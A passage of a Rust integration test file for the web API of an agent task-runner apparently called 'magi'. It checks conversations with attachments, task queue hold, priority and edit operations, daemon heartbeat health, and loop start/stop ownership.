        let id = seed_talk(&f, "20260905-000000-f6a7", "open");

        let uploaded = f
            .post_bytes(
                &format!("/api/talks/{id}/attachments"),
                &[("Content-Type", "image/png"), ("X-Filename", "shot.png")],
                PNG_BYTES,
            )
            .await;
        assert_eq!(uploaded.status, 201, "{}", uploaded.body);
        let att_id = uploaded.json()["id"].as_str().expect("id").to_owned();

        let res = f
            .post(
                &format!("/api/talks/{id}/say"),
                Some(&format!(r#"{{"text":"","attachments":["{att_id}"]}}"#)),
            )
            .await;
        assert_eq!(res.status, 202, "{}", res.body);
        let queued = res.json();
        let turns = queued["turns"].as_array().expect("turns array");
        assert_eq!(
            turns.len(),
            1,
            "an empty body with an attachment is still a turn: {queued}"
        );
        assert_eq!(turns[0]["who"], "operator");
        assert_eq!(turns[0]["body"], "");
        let atts = turns[0]["attachments"]
            .as_array()
            .expect("attachments array");
        assert_eq!(atts.len(), 1);
        assert_eq!(atts[0]["id"], att_id);
        assert_eq!(atts[0]["mime"], "image/png");

        // Not only in the response: `record` flushes to disk before the
        // agent's own turn is even spawned.
        let on_disk = f.talks().get(&id).expect("get");
        assert_eq!(on_disk.turns[0].attachments.len(), 1);
        assert_eq!(on_disk.turns[0].attachments[0].id, att_id);
    }

    #[tokio::test]
    async fn saying_with_an_unknown_attachment_id_is_a_4xx_and_records_nothing() {
        let f = Fixture::start().await;
        let id = seed_talk(&f, "20260905-000000-a7b8", "open");

        let res = f
            .post(
                &format!("/api/talks/{id}/say"),
                Some(&format!(
                    r#"{{"text":"hi","attachments":["{}"]}}"#,
                    "a".repeat(32)
                )),
            )
            .await;
        assert!((400..500).contains(&res.status), "{}", res.body);
        assert!(res.body.contains("unknown attachment"), "{}", res.body);

        let on_disk = f.talks().get(&id).expect("get");
        assert!(
            on_disk.turns.is_empty(),
            "a rejected attachment id must not partially record the turn: {:?}",
            on_disk.turns
        );
    }

    #[tokio::test]
    async fn talk_close_makes_the_talk_refuse_further_turns() {
        let f = Fixture::start().await;
        let id = seed_talk(&f, "20260904-014455-cd34", "open");

        let closed = f.post(&format!("/api/talks/{id}/close"), None).await;
        assert_eq!(closed.status, 200, "{}", closed.body);
        assert_eq!(closed.json()["status"], "closed");

        // Idempotent: closing an already-closed talk is not an error.
        let closed_again = f.post(&format!("/api/talks/{id}/close"), None).await;
        assert_eq!(closed_again.status, 200);
        assert_eq!(closed_again.json()["status"], "closed");
    }

    #[tokio::test]
    async fn talk_reopen_lets_a_closed_talk_take_turns_again_and_is_idempotent() {
        let (_tmp, _repo, f) = talk_fixture().await;
        let id = f.post("/api/talks", None).await.json()["id"]
            .as_str()
            .expect("id")
            .to_owned();
        let closed = f.post(&format!("/api/talks/{id}/close"), None).await;
        assert_eq!(closed.status, 200, "{}", closed.body);

        let reopened = f.post(&format!("/api/talks/{id}/reopen"), None).await;
        assert_eq!(reopened.status, 200, "{}", reopened.body);
        assert_eq!(reopened.json()["status"], "open");

        // Idempotent: reopening an already-open talk is not an error.
        let reopened_again = f.post(&format!("/api/talks/{id}/reopen"), None).await;
        assert_eq!(reopened_again.status, 200);
        assert_eq!(reopened_again.json()["status"], "open");

        let said = f
            .post(
                &format!("/api/talks/{id}/say"),
                Some(r#"{"text":"still there?"}"#),
            )
            .await;
        assert_eq!(
            said.status, 202,
            "a reopened talk accepts turns again: {}",
            said.body
        );
    }

    #[tokio::test]
    async fn talk_reopen_on_an_unknown_id_is_404() {
        let f = Fixture::start().await;
        let res = f.post("/api/talks/nonexistent-id/reopen", None).await;
        assert_eq!(res.status, 404, "{}", res.body);
    }

    #[tokio::test]
    async fn talk_delete_removes_the_talk_from_disk_and_the_list() {
        let f = Fixture::start().await;
        let id = seed_talk(&f, "20260904-014455-ef56", "closed");

        let deleted = f.delete(&format!("/api/talks/{id}")).await;
        assert_eq!(deleted.status, 204, "{}", deleted.body);

        let after = f.get(&format!("/api/talks/{id}")).await;
        assert_eq!(after.status, 404, "{}", after.body);

        let listed = f.get("/api/talks").await.json();
        assert!(
            listed.as_array().unwrap().iter().all(|t| t["id"] != id),
            "a deleted talk must not linger in the list: {listed}"
        );
    }

    #[tokio::test]
    async fn talk_delete_on_an_unknown_id_is_404() {
        let f = Fixture::start().await;
        let res = f.delete("/api/talks/nonexistent-id").await;
        assert_eq!(res.status, 404, "{}", res.body);
    }

    #[tokio::test]
    async fn holding_then_releasing_returns_a_task_to_the_loop_with_a_fresh_budget() {
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut task = Task::new(
            "spent".to_owned(),
            "Try again".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        task.start("20260902-140502-bbbb".to_owned());
        task.fail("agent gave up", 9);
        queue.put(&mut task).expect("file the task");

        let held = f.post(&format!("/api/queue/{}/hold", task.id), None).await;
        assert_eq!(held.status, 200);
        assert_eq!(held.json()["status_str"], "held");

        let released = f
            .post(&format!("/api/queue/{}/release", task.id), None)
            .await;
        assert_eq!(released.status, 200);
        assert_eq!(released.json()["status_str"], "queued");
        assert_eq!(
            released.json()["attempts"],
            0,
            "release is a real second chance, not an instant re-hold"
        );
        assert_eq!(
            queue.get(&task.id).expect("reload").status,
            TaskStatus::Queued,
            "the change is on disk, not only in the reply"
        );
        assert!(
            !f.home
                .path()
                .join("queue")
                .join(format!("{}.lock", task.id))
                .exists(),
            "the claim the mutation took is released again"
        );
    }

    #[tokio::test]
    async fn a_task_a_daemon_is_running_cannot_be_changed_from_the_phone() {
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut task = Task::new(
            "busy".to_owned(),
            "Running right now".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        queue.put(&mut task).expect("file the task");
        let _claim = queue.claim(&task.id).expect("stand in for the daemon");

        let res = f.post(&format!("/api/queue/{}/hold", task.id), None).await;

        assert_eq!(res.status, 409);
        assert_eq!(
            queue.get(&task.id).expect("reload").status,
            TaskStatus::Queued,
            "the refused hold changed nothing"
        );
    }

    #[tokio::test]
    async fn holding_with_a_reason_reads_back_from_show_and_the_card_and_release_clears_it() {
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut task = Task::new(
            "waiting on the migration".to_owned(),
            "Do the thing".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        queue.put(&mut task).expect("file the task");

        let held = f
            .post(
                &format!("/api/queue/{}/hold", task.id),
                Some(r#"{"reason":"waiting for 20260101-000000-aaaa to land"}"#),
            )
            .await;
        assert_eq!(held.status, 200, "{}", held.body);
        assert_eq!(held.json()["status_str"], "held");
        assert_eq!(
            held.json()["hold_reason"],
            "waiting for 20260101-000000-aaaa to land"
        );

        let listed = f.get("/api/queue").await.json();
        assert_eq!(
            listed[0]["hold_reason"], "waiting for 20260101-000000-aaaa to land",
            "the card reads the reason off the same list route"
        );

        // A hold with no body at all must keep working - most holds have no
        // reason to give.
        let mut plain = Task::new(
            "no reason given".to_owned(),
            "Do another thing".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        queue.put(&mut plain).expect("file the task");
        let held_plain = f.post(&format!("/api/queue/{}/hold", plain.id), None).await;
        assert_eq!(held_plain.status, 200, "{}", held_plain.body);
        assert!(held_plain.json()["hold_reason"].is_null());

        let released = f
            .post(&format!("/api/queue/{}/release", task.id), None)
            .await;
        assert_eq!(released.status, 200);
        assert!(
            released.json()["hold_reason"].is_null(),
            "a release must clear the reason so the next hold does not inherit it"
        );
    }

    #[tokio::test]
    async fn priority_can_be_raised_from_the_phone_and_moves_the_task_ahead() {
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut older = Task::new(
            "filed first".to_owned(),
            "x".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        older.id = "20260101-000001-aaaa".to_owned();
        let mut newer = Task::new(
            "filed second".to_owned(),
            "x".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        newer.id = "20260101-000002-bbbb".to_owned();
        queue.put(&mut older).expect("file older");
        queue.put(&mut newer).expect("file newer");

        // Equal priority: the newer task leads, the same order the old
        // newest-first `list()` already gave every equal-priority queue.
        let before = f.get("/api/queue").await.json();
        assert_eq!(before[0]["id"], newer.id);
        assert_eq!(before[1]["id"], older.id);

        // Raising the *older* task is the meaningful case: it can only lead
        // now because its priority says so, not because it happens to be
        // newest.
        let raised = f
            .post(
                &format!("/api/queue/{}/priority", older.id),
                Some(r#"{"priority":10}"#),
            )
            .await;
        assert_eq!(raised.status, 200, "{}", raised.body);
        assert_eq!(raised.json()["priority"], 10);

        let after = f.get("/api/queue").await.json();
        let names: Vec<&str> = after
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["id"].as_str().unwrap())
            .collect();
        // Highest priority first, which is the order next_runnable and
        // `magi task list` both use - GET /api/queue must agree with it
        // immediately, not just once the loop claims the task.
        assert_eq!(names[0], older.id, "the raised task now sorts first");
    }

    #[tokio::test]
    async fn priority_is_refused_on_a_running_task_with_a_reason_in_the_body() {
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut task = Task::new(
            "in flight".to_owned(),
            "x".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        task.start("20260902-140502-bbbb".to_owned());
        queue.put(&mut task).expect("file the task");

        let res = f
            .post(
                &format!("/api/queue/{}/priority", task.id),
                Some(r#"{"priority":9}"#),
            )
            .await;
        assert_eq!(res.status, 400, "{}", res.body);
        assert!(
            res.json()["error"]
                .as_str()
                .is_some_and(|e| e.contains("running")),
            "{}",
            res.body
        );
        assert_eq!(
            queue.get(&task.id).expect("reload").priority,
            0,
            "the refused write must not partially apply"
        );
    }

    #[tokio::test]
    async fn editing_replaces_title_and_instruction_and_keeps_id_created_at_source_and_runs() {
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut task = Task::new(
            "old title".to_owned(),
            "old instruction".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Agent {
                run: "20260101-000000-beef".to_owned(),
                node: "implement".to_owned(),
            },
        );
        task.runs.push("20260101-000000-beef".to_owned());
        queue.put(&mut task).expect("file the task");
        let created_at = task.created_at;

        let edited = f
            .post(
                &format!("/api/queue/{}/edit", task.id),
                Some(r#"{"title":"new title","instruction":"new instruction"}"#),
            )
            .await;
        assert_eq!(edited.status, 200, "{}", edited.body);
        let body = edited.json();
        assert_eq!(body["title"], "new title");
        assert_eq!(body["instruction"], "new instruction");
        assert_eq!(body["id"], task.id, "editing must not mint a new id");
        assert_eq!(body["created_at"], created_at.to_string());
        assert_eq!(
            body["source"]["kind"], "agent",
            "editing a task an agent filed must not turn it human: {body}"
        );
        assert_eq!(body["runs"], serde_json::json!(["20260101-000000-beef"]));

        let reloaded = queue.get(&task.id).expect("reload");
        assert_eq!(reloaded.title, "new title");
        assert_eq!(reloaded.instruction, "new instruction");
    }

    #[tokio::test]
    async fn editing_a_running_task_is_refused_with_a_reason_in_the_response() {
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut task = Task::new(
            "in flight".to_owned(),
            "do not touch".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        task.start("20260902-140502-bbbb".to_owned());
        queue.put(&mut task).expect("file the task");

        let res = f
            .post(
                &format!("/api/queue/{}/edit", task.id),
                Some(r#"{"title":"x","instruction":"y"}"#),
            )
            .await;
        assert_eq!(res.status, 400, "{}", res.body);
        assert!(
            res.json()["error"]
                .as_str()
                .is_some_and(|e| e.contains("running")),
            "{}",
            res.body
        );
        assert_eq!(
            queue.get(&task.id).expect("reload").instruction,
            "do not touch",
            "the refused edit must not change the file"
        );
    }

    #[tokio::test]
    async fn a_claimed_task_refuses_priority_and_edit_the_same_way_it_refuses_hold() {
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut task = Task::new(
            "busy".to_owned(),
            "Running right now".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        queue.put(&mut task).expect("file the task");
        let _claim = queue.claim(&task.id).expect("stand in for the daemon");

        let priority = f
            .post(
                &format!("/api/queue/{}/priority", task.id),
                Some(r#"{"priority":9}"#),
            )
            .await;
        assert_eq!(priority.status, 409, "{}", priority.body);

        let edit = f
            .post(
                &format!("/api/queue/{}/edit", task.id),
                Some(r#"{"title":"x","instruction":"y"}"#),
            )
            .await;
        assert_eq!(edit.status, 409, "{}", edit.body);
    }

    #[tokio::test]
    async fn done_from_the_phone_keeps_runs_source_and_created_at_unlike_delete() {
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut task = Task::new(
            "shipped by hand".to_owned(),
            "merged outside the loop".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Agent {
                run: "20260101-000000-b455".to_owned(),
                node: "implement".to_owned(),
            },
        );
        task.runs.push("20260101-000000-b455".to_owned());
        task.runs.push("20260101-000000-9af4".to_owned());
        queue.put(&mut task).expect("file the task");
        let created_at = task.created_at;

        let done = f.post(&format!("/api/queue/{}/done", task.id), None).await;
        assert_eq!(done.status, 200, "{}", done.body);
        assert_eq!(done.json()["status_str"], "done");

        let reloaded = queue.get(&task.id).expect("a done task is still on disk");
        assert_eq!(
            reloaded.runs,
            ["20260101-000000-b455", "20260101-000000-9af4"]
        );
        assert_eq!(
            reloaded.source,
            Source::Agent {
                run: "20260101-000000-b455".to_owned(),
                node: "implement".to_owned(),
            }
        );
        assert_eq!(reloaded.created_at, created_at);
    }

    #[tokio::test]
    async fn closing_a_held_task_as_done_from_the_phone_clears_its_hold_reason() {
        // `done` is allowed on any status, including `held`, with no release
        // in between - so a task held for a reason and then closed directly
        // must not keep reading as "waiting on" it afterwards, on its card or
        // in `magi task show`.
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut task = Task::new(
            "landed while held".to_owned(),
            "x".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        task.hold(Some("waiting on 3ed9".to_owned()));
        queue.put(&mut task).expect("file the held task");

        let done = f.post(&format!("/api/queue/{}/done", task.id), None).await;
        assert_eq!(done.status, 200, "{}", done.body);
        assert_eq!(done.json()["status_str"], "done");
        assert!(
            done.json()["hold_reason"].is_null(),
            "a done task cannot still be waiting on something: {}",
            done.body
        );
    }

    #[tokio::test]
    async fn unknown_ids_are_json_not_found_on_both_stores() {
        let f = Fixture::start().await;

        let run = f.get("/api/runs/nosuchrun").await;
        let task = f.post("/api/queue/nosuchtask/hold", None).await;

        assert_eq!(run.status, 404);
        assert_eq!(task.status, 404);
        assert!(
            run.json()["error"]
                .as_str()
                .is_some_and(|e| e.contains("run")),
            "the error names what was not found: {}",
            run.body
        );
        assert!(
            task.json()["error"]
                .as_str()
                .is_some_and(|e| e.contains("task")),
            "the error names what was not found: {}",
            task.body
        );
    }

    #[tokio::test]
    async fn the_daemon_counts_as_running_only_while_its_heartbeat_is_fresh() {
        let f = Fixture::start().await;

        let missing = f.get("/api/health").await.json();
        assert_eq!(missing["daemon"]["running"], false, "no file, no daemon");

        write_daemon(
            f.home.path(),
            Timestamp::now() - jiff::SignedDuration::from_secs(60),
        );
        let stale = f.get("/api/health").await.json();
        assert_eq!(
            stale["daemon"]["running"], false,
            "a minute without a heartbeat is a dead daemon, not a busy one"
        );
        assert!(
            stale["daemon"]["stale_for_secs"]
                .as_i64()
                .is_some_and(|s| s >= 55),
            "staleness is reported so the UI can say how long: {stale}"
        );

        write_daemon(f.home.path(), Timestamp::now());
        let fresh = f.get("/api/health").await.json();
        assert_eq!(fresh["daemon"]["running"], true);
        assert_eq!(fresh["daemon"]["idle"], false);
        assert_eq!(fresh["daemon"]["pid"], 4242);
        assert_eq!(fresh["daemon"]["completed"], 7);
        assert_eq!(
            fresh["daemon"]["current"][0]["task"],
            "20260902-140501-aaaa"
        );
        assert_eq!(fresh["version"], env!("CARGO_PKG_VERSION"));
    }

    #[tokio::test]
    async fn the_loop_is_not_running_until_something_starts_it() {
        let f = Fixture::start().await;

        let view = f.get("/api/loop").await.json();
        assert_eq!(view["running"], false);
        assert_eq!(
            view["owned"], false,
            "nobody owns a loop that does not exist: {view}"
        );
        assert_eq!(view["stopping"], false);
        assert_eq!(view["last_error"], Value::Null);
        assert_eq!(view["daemon"]["running"], false);
        assert_eq!(
            view["repo"], "/repo/magi",
            "the repository a start would use, named before it is started"
        );
    }

    #[tokio::test]
    async fn starting_the_loop_runs_it_in_this_process_and_health_says_the_same() {
        let f = Fixture::start().await;

        let res = f.post("/api/loop", Some(r#"{"running":true}"#)).await;
        assert_eq!(res.status, 200, "{}", res.body);
        let view = res.json();
        assert_eq!(view["running"], true);
        assert_eq!(
            view["owned"], true,
            "the loop the UI started is the UI's own to stop: {view}"
        );
        assert_eq!(
            view["merge"],
            Value::Null,
            "no override was given, so each repository's own config decides"
        );

        // The same object from the route a waking phone polls first. Two
        // surfaces disagreeing about whether anything is running is exactly
        // the confusion this UI exists to remove.
        let health = f.get("/api/health").await.json();
        assert_eq!(health["loop"]["running"], true, "{health}");
        assert_eq!(health["loop"]["owned"], true, "{health}");

        f.post("/api/loop", Some(r#"{"running":false}"#)).await;
    }

    #[tokio::test]
    async fn a_second_start_is_refused_rather_than_racing_the_first_for_claims() {
        let f = Fixture::start().await;
        let first = f.post("/api/loop", Some(r#"{"running":true}"#)).await;
        assert_eq!(first.status, 200, "{}", first.body);

        let again = f.post("/api/loop", Some(r#"{"running":true}"#)).await;
        assert_eq!(
            again.status, 409,
            "two loops on one queue race for the same claims: {}",
            again.body
        );
        assert!(
            again.json()["error"]
                .as_str()
                .is_some_and(|e| e.contains("already running the loop")),
            "the refusal has to say why: {}",
            again.body
        );
        assert_eq!(
            f.get("/api/loop").await.json()["running"],
            true,
            "and the loop that was already running is untouched by it"
        );

        f.post("/api/loop", Some(r#"{"running":false}"#)).await;
    }

    #[tokio::test]
    async fn stopping_answers_at_once_and_the_loop_settles_stopped() {
        let f = Fixture::start().await;
        f.post("/api/loop", Some(r#"{"running":true}"#)).await;

        let res = f.post("/api/loop", Some(r#"{"running":false}"#)).await;
        assert_eq!(
            res.status, 200,
            "the answer must not wait for the loop: a run in flight is tens of \
             minutes and the operator is holding a phone: {}",
            res.body
        );

        let view = settled(&f, |v| v["running"] == false).await;
        assert_eq!(view["owned"], false);
        assert_eq!(
            view["stopping"], false,
            "a loop that has stopped is not still stopping: {view}"
        );
        assert_eq!(
            view["last_error"],
            Value::Null,
            "a loop that was asked to stop did not fail: {view}"
        );

        // Idempotent, because the operator cannot tell a slow stop from a lost
        // one and will press it again.
        let twice = f.post("/api/loop", Some(r#"{"running":false}"#)).await;
        assert_eq!(twice.status, 200, "{}", twice.body);
    }

    #[tokio::test]
    async fn a_loop_another_process_owns_can_be_neither_started_nor_stopped_here() {
        let f = Fixture::start().await;
        // How the operator has been doing it: a `magi serve` of their own,
        // heartbeat fresh, in the same home this UI reads.
        write_daemon(f.home.path(), Timestamp::now());

        let view = f.get("/api/loop").await.json();
        assert_eq!(view["running"], false, "not in this process: {view}");
        assert_eq!(view["owned"], false, "and not this process's to control");
        assert_eq!(
            view["daemon"]["running"], true,
            "but a loop is alive somewhere, which is what the UI must say"
        );
        assert_eq!(view["daemon"]["pid"], 4242);

        for body in [r#"{"running":true}"#, r#"{"running":false}"#] {
            let res = f.post("/api/loop", Some(body)).await;
            assert_eq!(
                res.status, 409,
                "neither button may pretend to work on someone else's loop: {}",
                res.body
            );
            assert!(
                res.json()["error"]
                    .as_str()
                    .is_some_and(|e| e.contains("4242")),
                "the refusal has to name the process the operator must go to: {}",
                res.body
            );
        }
        assert_eq!(
            f.get("/api/loop").await.json()["running"],
            false,
            "and the refusal started nothing"
        );
    }

    #[tokio::test]
    async fn a_stale_status_file_is_not_a_foreign_owner() {
        let f = Fixture::start().await;
        write_daemon(
            f.home.path(),
            Timestamp::now() - jiff::SignedDuration::from_secs(60),
        );

        let res = f.post("/api/loop", Some(r#"{"running":true}"#)).await;
        assert_eq!(
            res.status, 200,
            "a daemon killed a minute ago must not lock the loop out of its \
             own home for good: {}",
            res.body
        );
        assert_eq!(res.json()["running"], true);

        f.post("/api/loop", Some(r#"{"running":false}"#)).await;
    }

    #[tokio::test]
    async fn loop_rev_moves_on_a_start_so_a_phone_learns_without_polling() {
        let f = Fixture::start().await;
        let before = f.get("/api/health").await.json()["loop_rev"]
            .as_u64()
            .expect("a loop revision");

        f.post("/api/loop", Some(r#"{"running":true}"#)).await;

        let after = f.get("/api/health").await.json()["loop_rev"]
            .as_u64()
            .expect("a loop revision");
        assert!(
            after > before,
            "the loop is in-process state, so this counter is the only thing \
             that tells a second device the first one started it: {before} -> \
             {after}"
        );

        f.post("/api/loop", Some(r#"{"running":false}"#)).await;
    }

    #[tokio::test]
    async fn a_loop_that_failed_says_why_and_does_not_read_as_running() {
        let f = Fixture::with_loop(launch_broken).await;

        let res = f.post("/api/loop", Some(r#"{"running":true}"#)).await;
        assert_eq!(
            res.status, 200,
            "starting it is not the failure: {}",
            res.body
        );

        let view = settled(&f, |v| v["last_error"].is_string()).await;
        assert_eq!(
            view["running"], false,
            "a loop that died must not read as running, or the operator has \
             nothing to press: {view}"
        );
        assert_eq!(view["owned"], false);
        assert!(
            view["last_error"]
                .as_str()
                .is_some_and(|e| e.contains("read-only file system")),
            "the phone is where a loop that died at 3am is visible: {view}"
        );

        // And it can be started again: the corpse was reaped, not left to
        // occupy the slot.
        let again = f.post("/api/loop", Some(r#"{"running":true}"#)).await;
        assert_eq!(again.status, 200, "{}", again.body);
        assert_eq!(
            again.json()["last_error"],
            Value::Null,
            "a fresh start does not keep showing why the last one died"
        );
    }

    /// An upgrade parks the run in flight before it restarts, and a park waits
    /// for the node - up to `timeout_implement`, an hour by default. The deck
    /// has to answer for all of it: the operator has just been told a run is
    /// finishing first, and this address is the only place that says how it is
    /// going. It did not, once - the listener went with the `select!` arm that
    /// began the handover, and the phone got `Cannot reach magi: Failed to
    /// fetch` for the rest of the wave.
    ///
    /// The other half is the older rule: the address must be free *before* the
    /// successor is started, or it dies on "address already in use" with its
    /// stdio sent to null and the deck never comes back.
    #[tokio::test]
    async fn the_deck_answers_while_it_parks_and_frees_the_address_first() {
        let home = TempDir::new().expect("temp home");
        let runs = home.path().join("runs");
        std::fs::create_dir_all(&runs).expect("runs dir");
        let ui = Ui::new(
            Queue::at(home.path().join("queue")),
            Questions::at(home.path().join("questions")),
            Talks::at(home.path().join("talks")),
            runs,
            home.path().to_path_buf(),
            PathBuf::from("/repo/magi"),
        )
        .with_worktrees_root(home.path().join("wt"))
        .with_launch(launch_knocking_on_the_way_out);
        let looping = ui.looping();
        let listener = tokio::net::TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
            .await
            .expect("bind loopback");
        let addr = listener.local_addr().expect("local addr");
        *PARK_KNOCK.lock().expect("park knock") = Some(addr);
        let served = tokio::spawn(axum::serve(listener, ui.router()).into_future());

        let started = request(addr, "POST", "/api/loop", Some(r#"{"running":true}"#)).await;
        assert_eq!(started.status, 200, "the loop starts: {}", started.body);

        // The successor's whole job, and the one thing it cannot do while this
        // process still holds the socket.
        let bound = std::sync::Mutex::new(None);
        hand_over(home.path(), &looping, served, || {
            let attempt = std::net::TcpListener::bind(addr).map_err(|e| e.to_string());
            *bound.lock().expect("bound") = Some(attempt);
            Ok(())
        })
        .await
        .expect("hand over");

        assert_eq!(
            *PARK_HEARD.lock().expect("park heard"),
            Some(200),
            "the deck must answer while the loop is parking"
        );
        let attempt = bound
            .lock()
            .expect("bound")
            .take()
            .expect("the successor was started");
        assert!(
            attempt.is_ok(),
            "and the address must be free by the time it is: {attempt:?}"
        );
    }

    #[tokio::test]
    async fn a_newer_daemon_status_file_still_renders() {
        let f = Fixture::start().await;
        // A field this build has never heard of must not turn the status line
        // into a 500; that is the whole reason the reader is permissive.
        std::fs::write(
            f.home.path().join("daemon.json"),
            serde_json::json!({
                "schema": 2,
                "updated_at": Timestamp::now().to_string(),
                "idle": true,
                "surprise": { "nested": [1, 2, 3] },
            })
            .to_string(),
        )
        .expect("write daemon.json");

        let health = f.get("/api/health").await;

        assert_eq!(health.status, 200);
        assert_eq!(health.json()["daemon"]["running"], true);
    }

    #[tokio::test]
    async fn a_corrupt_run_is_skipped_in_the_list_and_explained_on_its_own_route() {
        let f = Fixture::start().await;
        write_run(&f.runs(), "20260902-140501-good", RunStatus::Ready);
        let broken = f.runs().join("20260902-140502-bad");
        std::fs::create_dir_all(&broken).expect("run dir");
        std::fs::write(broken.join("run.json"), "{ truncated").expect("write run.json");

        let list = f.get("/api/runs").await;
        let detail = f.get("/api/runs/20260902-140502-bad").await;

        assert_eq!(list.status, 200);
        let listed = list.json();
        let ids: Vec<&str> = listed
            .as_array()
            .expect("an array")
            .iter()
            .map(|r| r["id"].as_str().expect("an id"))
            .collect();
        assert_eq!(
            ids,
            vec!["20260902-140501-good"],
            "one unreadable run must not cost the operator the whole history"
        );
        assert_eq!(detail.status, 500);
        assert!(
            detail.json()["error"]
                .as_str()
                .is_some_and(|e| e.contains("run.json")),
            "the failure names the file to look at: {}",
            detail.body
        );
        // A skipped run has to be countable somewhere, or the UI shows an
        // empty history with nothing to explain it - which is exactly what a
        // directory full of older-schema runs looks like.
        let health = f.get("/api/health").await;
        assert_eq!(health.json()["runs_unreadable"], 1);
    }

    #[tokio::test]
    async fn a_run_is_summarised_for_the_list_and_served_whole_on_its_own_route() {
        let f = Fixture::start().await;
        write_run(&f.runs(), "20260902-140501-a1b2", RunStatus::Ready);

        let summary = f.get("/api/runs").await.json();
        let row = &summary[0];
        assert_eq!(row["short"], "a1b2");
        assert_eq!(row["status"], "ready");
        assert_eq!(row["done"], true);
        assert_eq!(row["title"], "Add a web UI");
        assert_eq!(row["repo_name"], "magi");
        assert_eq!(row["judges"], 3);
        assert_eq!(row["winner"], Value::Null);
        assert_eq!(row["reviews"], 0);

        // The short id resolves, and the detail route is the state itself, not
        // a projection of it: the UI reads fields the summary does not carry.
        let detail = f.get("/api/runs/a1b2").await;
        assert_eq!(detail.status, 200);
        assert_eq!(detail.json()["base_branch"], "main");
        assert_eq!(detail.json()["id"], "20260902-140501-a1b2");
    }

    /// `RunState::active` is only ever cleared by whoever populated it, so the
    /// detail route also has to say whether a daemon is actually still
    /// driving this run right now — otherwise a seat from a killed process's
    /// last wave would read as live forever.
    #[tokio::test]
    async fn run_detail_reports_active_seats_and_whether_a_daemon_confirms_them() {
        let f = Fixture::start().await;
        // Matches `write_daemon`'s hard-coded `current.run`, so the second
        // half of this test can claim the daemon is working on it without a
        // second helper.
        let id = "20260902-140502-bbbb";
        let mut state = RunState::new(
            PathBuf::from("/repo/magi"),
            "main".to_owned(),
            "0123456789abcdef".to_owned(),
            "Add a web UI".to_owned(),
            Config::default(),
        );
        state.id = id.to_owned();
        state.status = RunStatus::Judging;
        state.seat_started("judge", "judge-2", std::time::Duration::from_secs(120), 0);
        let dir = f.runs().join(id);
        std::fs::create_dir_all(&dir).expect("run dir");
        std::fs::write(
            dir.join("run.json"),
            serde_json::to_string_pretty(&state).expect("serialize run"),
        )
        .expect("write run.json");

        // No daemon.json at all: the entry cannot be told from a leftover, so
        // the route must say so rather than let the phone assume it is live.
        let cold = f.get(&format!("/api/runs/{id}")).await.json();
        assert_eq!(cold["active"]["judge-2"]["node"], "judge");
        assert_eq!(cold["live"], false, "{cold}");

        // A fresh heartbeat naming exactly this run: the same entry now reads
        // as confirmed, not merely recorded.
        write_daemon(f.home.path(), Timestamp::now());
        let warm = f.get(&format!("/api/runs/{id}")).await.json();
        assert_eq!(warm["live"], true, "{warm}");
    }

    #[tokio::test]
    async fn the_run_list_is_newest_first_and_honours_a_limit() {
        let f = Fixture::start().await;
        for id in [
            "20260902-140501-aaaa",
            "20260902-140502-bbbb",
            "20260902-140503-cccc",
        ] {
            write_run(&f.runs(), id, RunStatus::Merged);
        }

        let all = f.get("/api/runs").await.json();
        let capped = f.get("/api/runs?limit=2").await.json();

        assert_eq!(all[0]["id"], "20260902-140503-cccc");
        assert_eq!(all.as_array().map(Vec::len), Some(3));
        assert_eq!(capped.as_array().map(Vec::len), Some(2));
        assert_eq!(capped[0]["id"], "20260902-140503-cccc");
    }

    #[tokio::test]
    async fn the_report_route_serves_the_terminal_report_as_plain_text() {
        let f = Fixture::start().await;
        write_run(&f.runs(), "20260902-140501-a1b2", RunStatus::Blocked);

        let res = f.get("/api/runs/20260902-140501-a1b2/report").await;

        assert_eq!(res.status, 200);
        assert!(
            res.headers
                .contains("content-type: text/plain; charset=utf-8"),
            "a browser must render it, not download it: {}",
            res.headers
        );
        // The assertion is on content, not on the absence of escapes: colour
        // is a process-global that `serve` turns off at startup, and another
        // test in this binary may own it while this one runs.
        assert!(
            res.body.contains("20260902-140501-a1b2"),
            "the report is about the run that was asked for: {}",
            res.body
        );
    }

    #[tokio::test]
    async fn the_front_end_is_served_from_the_binary_with_types_a_phone_renders() {
        let f = Fixture::start().await;

        let html = f.get("/").await;
        let css = f.get("/app.css").await;
        let js = f.get("/app.js").await;

        assert_eq!((html.status, css.status, js.status), (200, 200, 200));
        assert!(
            html.headers
                .contains("content-type: text/html; charset=utf-8")
        );
        assert!(css.headers.contains("content-type: text/css"));
        assert!(js.headers.contains("content-type: text/javascript"));
        assert_eq!(html.body, INDEX_HTML, "compiled in, never read from disk");
    }

    #[test]
    fn review_rounds_label_a_distinct_verified_head() {
        assert!(APP_JS.contains("round.verified_head"));
        assert!(APP_JS.contains("verified HEAD"));
        assert!(APP_JS.contains("verified ${String(round.verified_head).slice(0, 7)}"));
    }

    #[tokio::test]
    async fn the_change_stream_announces_the_current_revisions_on_connect() {
        let f = Fixture::start().await;

        let mut socket = tokio::net::TcpStream::connect(f.addr)
            .await
            .expect("connect");
        socket
            .write_all(
                b"GET /api/events HTTP/1.1\r\nHost: magi\r\nAccept: text/event-stream\r\n\r\n",
            )
            .await
            .expect("write request");

